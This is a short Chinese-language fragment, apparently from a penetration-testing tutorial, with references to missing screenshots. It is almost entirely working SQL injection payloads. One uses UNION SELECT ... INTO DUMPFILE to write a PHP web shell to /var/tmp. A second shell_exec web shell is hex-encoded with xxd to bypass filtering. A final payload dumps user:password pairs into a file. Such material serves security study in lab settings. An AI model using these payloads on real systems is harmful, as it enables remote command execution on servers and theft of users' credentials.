        如图所示


        ‘ union select null,”<?php passthru($_GET[‘cmd’]); ?>“ INTO DUMPFILE “/var/tmp/a.php”–+ #写入文件放在tmp文件夹

          url绕过


          在b.php中写入


          <?php echo shell_exec($_GET[‘cmd’]);?>

            在kali中进行十六进制编码


            cat b.php | xxd -ps | tr -d ‘\n’

              将得到的一串字符在 BurpSuite 中进行粘贴替换原来的 “<?php%20passthru($_GET[‘cmd’]);%20?>”，前面加上 (0x)表示进制


              保存下载数据库


              ‘ union select null, concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–
